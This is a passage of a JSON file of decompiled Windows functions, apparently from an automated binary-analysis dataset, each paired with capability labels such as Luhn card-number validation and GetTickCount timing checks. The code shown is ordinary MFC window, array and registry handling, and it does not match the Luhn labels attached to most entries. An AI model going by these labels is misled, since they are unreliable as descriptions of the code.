pcVar1 = _sym.imp.USER32.dll_CopyRect;\n            (*_sym.imp.USER32.dll_CopyRect)(&lpPoints, &lprcSrc);\n            (*pcVar1)(&lprcDst, &lprcSrc);\n        }\n        else {\n            (*pcVar1)(iVar5, &lpPoints);\n            uVar3 = fcn.00415713(iVar5, 2);\n            fcn.0041577e(uVar3, iVar5);\n            (*_sym.imp.USER32.dll_CopyRect)(&lprcDst, &lprcSrc);\n        }\n    }\n    else {\n        uVar3 = (*_sym.imp.USER32.dll_GetParent)(*(in_ECX + 0x20));\n        pcVar1 = _sym.imp.USER32.dll_GetClientRect;\n        (*_sym.imp.USER32.dll_GetClientRect)(uVar3, &lprcDst);\n        (*pcVar1)(iVar5, &lpPoints);\n        (*_sym.imp.USER32.dll_MapWindowPoints)(iVar5, uVar3, &lpPoints, 2);\n    }\n    iVar5 = (lpPoints + var_20h) / 2 - (var_30h - var_38h) / 2;\n    iVar4 = (var_24h + var_1ch) / 2 - (var_2ch - var_34h) / 2;\n    if ((lprcDst <= iVar5) && (lprcDst = iVar5,  var_10h < (var_30h - var_38h) + iVar5)) {\n        lprcDst = (var_38h - var_30h) + var_10h;\n    }\n    if ((var_14h <= iVar4) && (var_14h = iVar4,  var_ch < (var_2ch - var_34h) + iVar4)) {\n        var_14h = (var_34h - var_2ch) + var_ch;\n    }\n    fcn.0041c2a1(0, lprcDst, var_14h, 0xffffffff, 0xffffffff, 0x15);\n    return;\n}\n",
        "token_count": 1078
    },
    "004185ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004185ec(void)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    uint *puVar2;\n    uint32_t unaff_retaddr;\n    \n    iVar1 = fcn.00418551(0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = iVar1 + 0x1c;\n    if (iVar1 == 0) {\n        fcn.00411e42();\n        iVar1 = extraout_ECX;\n    }\n    if (*(iVar1 + 4) != 0) {\n        for (puVar2 = *(*(iVar1 + 4) + ((unaff_retaddr >> 4) % *(iVar1 + 8)) * 4); puVar2 != NULL; puVar2 = *puVar2) {\n            if (puVar2[1] == unaff_retaddr) {\n                return puVar2[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 220
    },
    "0041b2a7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041b2a7(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStackY532;\n    uint in_stack_fffffe08;\n    \n    fcn.004627e2();\n    fcn.0043026e();\n    fcn.00411a2b();\n    *in_FS_OFFSET = uStackY532;\n    fcn.0045e747(in_stack_fffffe08);\n    return;\n}\n",
        "token_count": 96
    },
    "0041b694": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041b694(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.0042fcbb();\n    iVar1 = iVar1 + 0x7c;\n    iVar2 = fcn.0043026e();\n    var_1ch = *(iVar2 + 8);\n    if (((arg_ch == 0) && (arg_10h == 0)) && (arg_14h == 0)) {\n        puVar3 = fcn.00462f86();\n        var_4h = *puVar3;\n        puVar3 = fcn.00462f86();\n        *puVar3 = 0;\n        fcn.00463535(iVar1, 0x60, 0x5f, \"Afx:%p:%x\", var_1ch);\n    }\n    else {\n        puVar3 = fcn.00462f86();\n        var_4h = *puVar3;\n        puVar3 = fcn.00462f86();\n        *puVar3 = 0;\n        fcn.00463535(iVar1, 0x60, 0x5f, \"Afx:%p:%x:%p:%p:%p\", var_1ch);\n    }\n    piVar4 = fcn.00462f86();\n    if (*piVar4 == 0) {\n        puVar3 = fcn.00462f86();\n        *puVar3 = var_4h;\n    }\n    else {\n        puVar3 = fcn.00462f86();\n        fcn.0041367c(*puVar3);\n    }\n    iVar2 = fcn.004169a4(var_1ch, iVar1, &var_2ch);\n    if (iVar2 == 0) {\n        var_2ch = arg_8h;\n        var_28h = _sym.imp.USER32.dll_DefWindowProcA;\n        var_18h = arg_14h;\n        var_14h = arg_ch;\n        var_10h = arg_10h;\n        var_20h = 0;\n        var_24h = 0;\n        var_ch = 0;\n        var_8h = iVar1;\n        iVar2 = fcn.0041b606(&var_2ch);\n        if (iVar2 == 0) {\n            fcn.0042d7eb();\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 667
    },
    "0041c1e7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0041c1e7(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    \n    iVar1 = *param_1;\n    if (iVar1 == 0) {\n        iVar1 = fcn.00411e42();\n        param_1 = extraout_ECX;\n    }\n    *param_1 = *(iVar1 + 4);\n    return iVar1 + 8;\n}\n",
        "token_count": 105
    },
    "0041c8a7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041c8a7(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(param_1 + 0x4c);\n    if (iVar1 == 0) {\n        return iVar1;\n    }\n    iVar1 = *(iVar1 + 0x44);\n    while( true ) {\n        if (iVar1 == 0) {\n            return 0;\n        }\n        piVar2 = *(iVar1 + 8);\n        if (piVar2[1] == 0) {\n            iVar4 = *piVar2;\n        }\n        else {\n            iVar4 = *(piVar2[1] + 0x24);\n        }\n        if ((iVar4 != 0) && (iVar3 = (*_sym.imp.USER32.dll_GetFocus)(),  iVar4 == iVar3)) break;\n        if ((piVar2[1] != 0) && (piVar2[1] == *(*(param_1 + 0x4c) + 0x70))) {\n            return iVar1;\n        }\n        fcn.0041c1ce();\n    }\n    return iVar1;\n}\n",
        "token_count": 300
    },
    "0041cef2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041cef2(uint noname_0, int32_t *arg_ch)\n\n{\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_SetRectEmpty)(&var_10h);\n    fcn.004336a4(&var_10h, 1);\n    *arg_ch = *arg_ch + var_10h;\n    arg_ch[1] = arg_ch[1] + var_ch + -2;\n    arg_ch[2] = arg_ch[2] + var_8h;\n    arg_ch[3] = arg_ch[3] + var_4h;\n    return;\n}\n",
        "token_count": 168
    },
    "0041cfbf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041cfbf(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int32_t unaff_EDI;\n    \n    iVar1 = arg_8h;\n    iVar4 = unaff_EDI;\n    if (-1 < arg_8h) goto code_r0x0041cfd2;\n    do {\n        fcn.00411e42();\n        iVar4 = unaff_EDI;\ncode_r0x0041cfd2:\n        if (-1 < arg_ch) {\n            *(in_ECX + 0x10) = arg_ch;\n        }\n        if (iVar1 == 0) {\n            if (*(in_ECX + 4) != 0) {\n                fcn.004115a4(*(in_ECX + 4));\n                *(in_ECX + 4) = 0;\n            }\n            *(in_ECX + 0xc) = 0;\n            *(in_ECX + 8) = 0;\n            return;\n        }\n        if (*(in_ECX + 4) == 0) {\n            iVar3 = *(in_ECX + 0x10);\n            if (*(in_ECX + 0x10) < iVar1) {\n                iVar3 = iVar1;\n            }\n            uVar2 = fcn.00411579(iVar3 << 2, iVar4);\n            *(in_ECX + 4) = uVar2;\n            fcn.00462290(uVar2, 0, iVar3 << 2);\n            *(in_ECX + 0xc) = iVar3;\n            goto code_r0x0041d0ee;\n        }\n        unaff_EDI = *(in_ECX + 0xc);\n        if (iVar1 <= unaff_EDI) {\n            iVar4 = *(in_ECX + 8);\n            if (iVar4 < iVar1) {\n                fcn.00462290(*(in_ECX + 4) + iVar4 * 4, 0, (iVar1 - iVar4) * 4);\n            }\n            goto code_r0x0041d0ee;\n        }\n        iVar3 = *(in_ECX + 0x10);\n        if (iVar3 == 0) {\n            iVar3 = *(in_ECX + 8) + (*(in_ECX + 8) >> 0x1f & 7U) >> 3;\n            if (iVar3 < 4) {\n                iVar3 = 4;\n            }\n            else if (0x400 < iVar3) {\n                iVar3 = 0x400;\n            }\n        }\n        arg_8h = iVar3 + unaff_EDI;\n        if (iVar3 + unaff_EDI <= iVar1) {\n            arg_8h = iVar1;\n        }\n    } while (arg_8h < unaff_EDI);\n    iVar4 = fcn.00411579(arg_8h << 2, iVar4);\n    fcn.0041314e(iVar4, arg_8h << 2, *(in_ECX + 4), *(in_ECX + 8) << 2);\n    fcn.00462290(iVar4 + *(in_ECX + 8) * 4, 0, (iVar1 - *(in_ECX + 8)) * 4);\n    fcn.004115a4(*(in_ECX + 4));\n    *(in_ECX + 4) = iVar4;\n    *(in_ECX + 0xc) = arg_8h;\ncode_r0x0041d0ee:\n    *(in_ECX + 8) = iVar1;\n    return;\n}\n",
        "token_count": 827
    },
    "0041d1b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0041d1b4(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0041cd5d(*param_2 + -0x10);\n    *param_1 = iVar1 + 0x10;\n    return param_1;\n}\n",
        "token_count": 85
    },
    "0041d308": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0041d308(int32_t param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    if (0 < *(param_1 + 0x74)) {\n        do {\n            fcn.0041d2c2();\n            iVar2 = iVar2 + 1;\n        } while (iVar2 < *(param_1 + 0x74));\n    }\n    iVar2 = fcn.00433487(param_2, param_3);\n    if (iVar2 != 0) {\n        iVar2 = 0;\n        if (0 < *(param_1 + 0x74)) {\n            iVar1 = *(param_1 + 0x78) + 0x10;\n            do {\n                if (iVar1 != 0) {\n                    fcn.0040f620();\n                }\n                iVar1 = iVar1 + 0x14;\n                iVar2 = iVar2 + 1;\n            } while (iVar2 < *(param_1 + 0x74));\n        }\n        iVar2 = 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 264
    },
    "0041da80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041da80(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint unaff_EDI;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    for (iVar1 = (**(*in_ECX + 0x110))(0x418, 0, 0); iVar1 != 0; iVar1 = iVar1 + -1) {\n        (**(*in_ECX + 0x110))(0x416, 0, 0);\n    }\n    fcn.00462290(&var_18h, 0, 0x14);\n    var_8h = 0xffffffff;\n    if (arg_8h == NULL) {\n        iVar1 = 0;\n        var_10h._0_1_ = 4;\n        if (0 < arg_ch) {\n            do {\n                iVar3 = (**(*in_ECX + 0x110))(0x414, 1, &var_18h);\n                if (iVar3 == 0) goto code_r0x0041dbad;\n                iVar1 = iVar1 + 1;\n            } while (iVar1 < arg_ch);\n        }\n    }\n    else {\n        var_20h = 0;\n        var_1ch = 0;\n        if (0 < arg_ch) {\n            do {\n                var_14h = *arg_8h;\n                arg_8h = arg_8h + 1;\n                var_10h._0_1_ = 4;\n                if (var_14h == 0) {\n                    var_10h._1_1_ = 1;\n                    uVar2 = fcn.0041be35();\n                    if (((uVar2 & 0x800) == 0) && (*0x4b66f8 != 0x40047)) {\n                        var_18h = 8;\n                    }\n                    else {\n                        var_18h = 6;\n                    }\n                }\n                else {\n                    var_10h._1_1_ = 0;\n                    var_18h = var_20h;\n                    var_20h = var_20h + 1;\n                }\n                iVar1 = (**(*in_ECX + 0x110))(0x414, 1, &var_18h);\n                if (iVar1 == 0) goto code_r0x0041dbad;\n                var_1ch = var_1ch + 1;\n            } while (var_1ch < arg_ch);\n        }\n    }\n    iVar1 = (**(*in_ECX + 0x110))(0x418, 0, 0);\n    in_ECX[0x1d] = iVar1;\n    in_ECX[0x28] = 1;\ncode_r0x0041dbad:\n    fcn.0045e747(unaff_EDI);\n    return;\n}\n",
        "token_count": 739
    },
    "0041dd6a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041dd6a(uint arg_8h, uint arg_ch, int32_t arg_10h, code *arg_14h)\n\n{\n    for (arg_10h = arg_10h + -1; -1 < arg_10h; arg_10h = arg_10h + -1) {\n        (*arg_14h)();\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "0041e732": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e732(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    bool bVar5;\n    uint var_20h;\n    uint var_18h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar4 = 0;\n    if (arg_14h == 0) {\n        arg_14h = arg_10h;\n        var_4h = fcn.0041dc9e(arg_8h, arg_ch, arg_10h);\n        iVar1 = fcn.0041dc9e(arg_8h, arg_ch, 0);\n        if ((iVar1 != var_4h) && (0 < arg_10h)) {\n            do {\n                iVar1 = (arg_14h + iVar4) / 2;\n                iVar2 = fcn.0041dc9e(arg_8h, arg_ch, iVar1);\n                if ((iVar2 != var_4h) && (bVar5 = iVar4 == iVar1,  iVar4 = iVar1,  iVar1 = arg_14h,  bVar5)) {\n                    fcn.0041dc9e(arg_8h, arg_ch, arg_14h);\n                    break;\n                }\n                arg_14h = iVar1;\n            } while (iVar4 < arg_14h);\n        }\n        fcn.0041e603(&var_10h, arg_8h, arg_ch);\n        iVar1 = var_10h;\ncode_r0x0041e8a8:\n        fcn.0041dc9e(arg_8h, arg_ch, iVar1);\n    }\n    else {\n        fcn.0041dc9e(arg_8h, arg_ch, 0);\n        piVar3 = fcn.0041e603(&var_10h, arg_8h, arg_ch);\n        iVar4 = *piVar3;\n        var_4h = piVar3[1];\n        var_8h = iVar4;\n        fcn.0041dc9e(arg_8h, arg_ch, 0x7fff);\n        piVar3 = fcn.0041e603(&var_18h, arg_8h, arg_ch);\n        iVar1 = *piVar3;\n        var_ch = piVar3[1];\n        var_10h = iVar1;\n        if (iVar4 < iVar1) {\n            do {\n                fcn.0041dc9e(arg_8h, arg_ch, (iVar1 + iVar4) / 2);\n                piVar3 = fcn.0041e603(&var_18h, arg_8h, arg_ch);\n                iVar4 = piVar3[1];\n                if (arg_10h < iVar4) {\n                    iVar4 = fcn.0041deb7(*piVar3, iVar4);\n                    if (iVar4 != 0) goto code_r0x0041e8a8;\n                    var_8h = *piVar3;\n                    var_4h = piVar3[1];\n                }\n                else {\n                    if (arg_10h <= iVar4) {\n                        return;\n                    }\n                    iVar4 = fcn.0041deb7(*piVar3, iVar4);\n                    iVar1 = var_8h;\n                    if (iVar4 != 0) goto code_r0x0041e8a8;\n                    iVar1 = *piVar3;\n                    var_ch = piVar3[1];\n                    var_10h = iVar1;\n                }\n                iVar4 = var_8h;\n            } while (var_8h < iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 864
    },
    "0041ea2d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ea2d(uint noname_0, int32_t *arg_ch)\n\n{\n    int32_t in_ECX;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_SetRectEmpty)(&var_10h);\n    fcn.004336a4(&var_10h, (*(in_ECX + 0x80) & 0xa000) != 0);\n    *arg_ch = *arg_ch + var_10h;\n    arg_ch[1] = arg_ch[1] + var_ch;\n    if (*0x4b66f8 < 0x40047) {\n        arg_ch[1] = arg_ch[1] + -2;\n    }\n    arg_ch[2] = arg_ch[2] + var_8h;\n    arg_ch[3] = arg_ch[3] + var_4h;\n    return;\n}\n",
        "token_count": 227
    },
    "0041fb11": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041fb11(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.004635fb(param_1, param_2, param_3, param_4);\n    fcn.00401000(uVar1);\n    return;\n}\n",
        "token_count": 79
    },
    "0041fb87": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041fb87(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int32_t unaff_EDI;\n    \n    iVar1 = arg_8h;\n    iVar4 = unaff_EDI;\n    if (-1 < arg_8h) goto code_r0x0041fb9a;\n    do {\n        fcn.00411e42();\n        iVar4 = unaff_EDI;\ncode_r0x0041fb9a:\n        if (-1 < arg_ch) {\n            *(in_ECX + 0x10) = arg_ch;\n        }\n        if (iVar1 == 0) {\n            if (*(in_ECX + 4) != 0) {\n                fcn.004115a4(*(in_ECX + 4));\n                *(in_ECX + 4) = 0;\n            }\n            *(in_ECX + 0xc) = 0;\n            *(in_ECX + 8) = 0;\n            return;\n        }\n        if (*(in_ECX + 4) == 0) {\n            iVar3 = *(in_ECX + 0x10);\n            if (*(in_ECX + 0x10) < iVar1) {\n                iVar3 = iVar1;\n            }\n            uVar2 = fcn.00411579(iVar3 << 2, iVar4);\n            *(in_ECX + 4) = uVar2;\n            fcn.00462290(uVar2, 0, iVar3 << 2);\n            *(in_ECX + 0xc) = iVar3;\n            goto code_r0x0041fcb6;\n        }\n        unaff_EDI = *(in_ECX + 0xc);\n        if (iVar1 <= unaff_EDI) {\n            iVar4 = *(in_ECX + 8);\n            if (iVar4 < iVar1) {\n                fcn.00462290(*(in_ECX + 4) + iVar4 * 4, 0, (iVar1 - iVar4) * 4);\n            }\n            goto code_r0x0041fcb6;\n        }\n        iVar3 = *(in_ECX + 0x10);\n        if (iVar3 == 0) {\n            iVar3 = *(in_ECX + 8) + (*(in_ECX + 8) >> 0x1f & 7U) >> 3;\n            if (iVar3 < 4) {\n                iVar3 = 4;\n            }\n            else if (0x400 < iVar3) {\n                iVar3 = 0x400;\n            }\n        }\n        arg_8h = iVar3 + unaff_EDI;\n        if (iVar3 + unaff_EDI <= iVar1) {\n            arg_8h = iVar1;\n        }\n    } while (arg_8h < unaff_EDI);\n    iVar4 = fcn.00411579(arg_8h << 2, iVar4);\n    fcn.0041314e(iVar4, arg_8h << 2, *(in_ECX + 4), *(in_ECX + 8) << 2);\n    fcn.00462290(iVar4 + *(in_ECX + 8) * 4, 0, (iVar1 - *(in_ECX + 8)) * 4);\n    fcn.004115a4(*(in_ECX + 4));\n    *(in_ECX + 4) = iVar4;\n    *(in_ECX + 0xc) = arg_8h;\ncode_r0x0041fcb6:\n    *(in_ECX + 8) = iVar1;\n    return;\n}\n",
        "token_count": 827
    },
    "0041ff78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.0041ff78(uint *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0042fcbb();\n    param_1[1] = iVar1;\n    param_1[2] = *(iVar1 + 0xf0);\n    *param_1 = *(iVar1 + 0xec);\n    *(iVar1 + 0xec) = param_2;\n    *(param_1[1] + 0xf0) = param_1;\n    return param_1;\n}\n",
        "token_count": 127
    },
    "00421b81": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421b81(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    \n    iVar2 = arg_8h;\n    if ((arg_8h == 0) || ((*(in_ECX + 0xf) & 4) == 0)) {\n        uVar3 = (*_sym.imp.USER32.dll_GetParent)(in_ECX[8]);\n        iVar4 = fcn.004185c5(uVar3);\n        if (iVar4 != 0) {\n            arg_8h = 0;\n            (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(*(iVar4 + 0x20), &arg_8h);\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n            if (iVar4 == arg_8h) {\n                return;\n            }\n        }\n        pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n        if (iVar2 == 0) {\n            if (in_ECX[0x2e] == 0) {\n                in_ECX[0xf] = in_ECX[0xf] | 0x80;\n                (**(*in_ECX + 0xf8))();\n            }\n        }\n        else {\n            if (in_ECX[0xf] < '\\0') {\n                in_ECX[0xf] = in_ECX[0xf] & 0xffffff7f;\n                (**(*in_ECX + 0xfc))();\n                arg_8h = in_ECX[8];\n                iVar4 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n                if (iVar4 == arg_8h) {\n                    (*pcVar1)(arg_8h, 6, 1, 0);\n                }\n            }\n            if ((*(in_ECX + 0xf) & 0x20) != 0) {\n                (*pcVar1)(in_ECX[8], 0x86, 1, 0);\n            }\n        }\n        fcn.0042023e((-(iVar2 != 0) & 0xfffffff0) + 0x20);\n    }\n    else {\n        fcn.0041bfb6(0);\n        (*_sym.imp.USER32.dll_SetFocus)(0);\n    }\n    return;\n}\n",
        "token_count": 529
    },
    "00421d94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421d94(uint param_1)\n\n{\n    fcn.0043026e();\n    fcn.00421627();\n    fcn.00430a08(param_1);\n    return;\n}\n",
        "token_count": 50
    },
    "00421db1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421db1(uint param_1)\n\n{\n    fcn.0043026e();\n    fcn.00421627();\n    fcn.00430a21(param_1);\n    return;\n}\n",
        "token_count": 50
    },
    "00422aee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00422aee(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_34h;\n    uint var_30h;\n    uint var_4h;\n    \n    fcn.00462818(0x28);\n    iVar1 = *(unaff_EBP + 8);\n    uVar2 = fcn.0042407a();\n    fcn.0040f840(uVar2);\n    *(unaff_EBP + -4) = 0;\n    uVar3 = fcn.0041be35();\n    if ((uVar3 & 0x4000) == 0) {\n        fcn.0042292f(extraout_ECX + 0xc4);\n        if (iVar1 != 0) {\n            fcn.00413a5f(0x494768);\n            fcn.00413a5f(iVar1);\n            if (0 < *(extraout_ECX + 0x58)) {\n                fcn.004634fc(unaff_EBP + -0x30, 0x20, 0x49476c, *(extraout_ECX + 0x58));\n                fcn.00413a5f(unaff_EBP + -0x30);\n            }\n        }\n    }\n    else {\n        if (iVar1 != 0) {\n            fcn.00413a5f(iVar1);\n            if (0 < *(extraout_ECX + 0x58)) {\n                fcn.004634fc(unaff_EBP + -0x30, 0x20, 0x49476c, *(extraout_ECX + 0x58));\n                fcn.00413a5f(unaff_EBP + -0x30);\n            }\n            fcn.00413a5f(0x494768);\n        }\n        fcn.0042292f(extraout_ECX + 0xc4);\n    }\n    fcn.0043042c(*(extraout_ECX + 0x20), *(unaff_EBP + -0x34));\n    fcn.00402740();\n    fcn.0046289b();\n    return;\n}\n",
        "token_count": 520
    },
    "00422ff8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00422ff8(uint param_1, uint param_2, uint param_3)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0046397b(param_1, param_2, param_3);\n    fcn.00401000(uVar1);\n    return;\n}\n",
        "token_count": 71
    },
    "00423c01": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00423c01(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_4h;\n    \n    fcn.0041d1b4(in_ECX + 0xc4, 0);\n    return arg_8h;\n}\n",
        "token_count": 80
    },
    "00423ed7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00423ed7(uint param_1, uchar *param_2, int32_t param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ushort *puVar3;\n    \n    if ((param_2 != NULL) && (param_3 != 0)) {\n        iVar2 = fcn.0043026e();\n        puVar3 = fcn.004026e0(*(iVar2 + 0xc), param_1);\n        if (puVar3 == NULL) {\n            *param_2 = 0;\n            iVar2 = 0;\n        }\n        else {\n            iVar2 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, puVar3 + 1, *puVar3, param_2, param_3 + -1, 0, 0)\n            ;\n            param_2[iVar2] = 0;\n        }\n        return iVar2;\n    }\n    fcn.00411e42();\n    pcVar1 = swi(3);\n    iVar2 = (*pcVar1)();\n    return iVar2;\n}\n",
        "token_count": 247
    },
    "00424a85": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00424a85(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    *(param_1 + 0xa0) = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_14h = 4;\n    var_ch = 0;\n    piVar2 = 0x4b686c;\n    var_10h = param_1;\n    iVar1 = *0x4b686c;\n    while (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(0x80000001, *piVar2, 0, 1, &var_4h);\n        if (iVar1 == 0) {\n            for (piVar3 = piVar2[1]; *piVar3 != 0; piVar3 = piVar3 + 2) {\n                iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(var_4h, *piVar3, 0, &var_ch, &var_8h, &var_14h);\n                if ((iVar1 == 0) && (var_ch == 4)) {\n                    if (var_8h == 0) {\n                        *(var_10h + 0xa0) = *(var_10h + 0xa0) & ~piVar3[1];\n                    }\n                    else {\n                        *(var_10h + 0xa0) = *(var_10h + 0xa0) | piVar3[1];\n                    }\n                }\n                var_8h = 0;\n                var_14h = 4;\n                var_ch = 0;\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n            var_4h = 0;\n        }\n        piVar2 = piVar2 + 2;\n        iVar1 = *piVar2;\n    }\n    return 1;\n}\n",
        "token_count": 499
    },
    "00424c81": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
